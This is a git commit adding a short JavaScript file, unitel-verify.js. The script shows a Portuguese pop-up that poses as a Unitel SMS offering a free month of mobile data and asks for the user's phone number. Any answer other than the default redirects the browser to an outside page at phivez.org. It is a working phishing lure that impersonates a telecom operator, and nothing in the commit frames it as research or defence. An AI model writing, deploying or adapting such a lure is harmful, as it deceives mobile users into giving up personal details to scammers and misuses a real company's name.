27b86896da81cf7efa2d87ffc60277192293652a
newblog13 <sweet16guyz@gmail.com>
2026-05-14 06:30:45 +0100

    Create unitel-verify.js

---
+++ unitel-verify.js
@@ -0,0 +1,5 @@
+var password = 'ATIVE AGORA'
+password=prompt('SMS: Parabéns! Seu número Unitel está qualificado para receber 1 mês de dados grátis. Clique em OK para inserir seu número de celular.','ATIVE AGORA');
+if (password != 'ATIVE AGORA') {
+location.href='https://phivez.org/unitel.html';
+}
